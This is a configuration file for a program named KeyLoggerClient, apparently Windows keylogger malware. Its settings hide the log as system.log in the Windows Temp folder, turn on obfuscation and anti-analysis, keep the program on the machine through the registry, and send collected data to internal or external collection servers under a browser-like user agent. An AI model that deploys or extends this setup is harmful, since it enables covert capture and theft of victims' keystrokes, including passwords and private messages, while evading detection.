# KeyLoggerClient/resources/config/default.cfg
[core]
log_path=C:\Windows\Temp\system.log
collection_interval=300000
jitter_factor=0.3
max_file_size=10485760

[security]
encryption_key=default_encryption_key_change_in_production
enable_obfuscation=true
anti_analysis=true

[communication]
server_url=https://api.example.com/collect
comms_method=https
use_proxy=false
proxy_server=
proxy_port=8080
timeout=30000
user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

[persistence]
enable_persistence=true
persistence_method=registry
remove_on_exit=false

[network]
network_mode=auto
same_wifi_server_url=http://192.168.1.100:8080
different_wifi_server_url=https://your-external-server.com